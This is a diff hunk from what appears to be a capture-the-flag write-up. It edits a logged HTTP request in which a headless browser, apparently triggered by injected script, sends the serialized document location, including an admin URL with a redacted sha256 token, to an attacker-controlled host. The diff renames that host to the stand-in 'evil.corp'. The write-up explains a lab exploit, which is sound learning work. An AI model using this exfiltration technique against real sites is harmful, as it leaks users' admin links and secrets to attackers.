@@ -78,7 +78,7 @@ And there we go we got the whole document object:
 
 ```
 GET /test.png?{%22location%22:{%22ancestorOrigins%22:{},%22href%22:%22http://motherload.td.org.uit.no:5000/admin?sha256=<REDACTED>%22,%22origin%22:%22http://motherload.td.org.uit.no:5000%22,%22protocol%22:%22http:%22,%22host%22:%22motherload.td.org.uit.no:5000%22,%22hostname%22:%22motherload.td.org.uit.no%22,%22port%22:%225000%22,%22pathname%22:%22/admin%22,%22search%22:%22?sha256=<REDACTED>%22,%22hash%22:%22%22}} HTTP/1.1
-Host: tjweb.no:1234
+Host: evil.corp:1234
 Connection: keep-alive
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36
 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
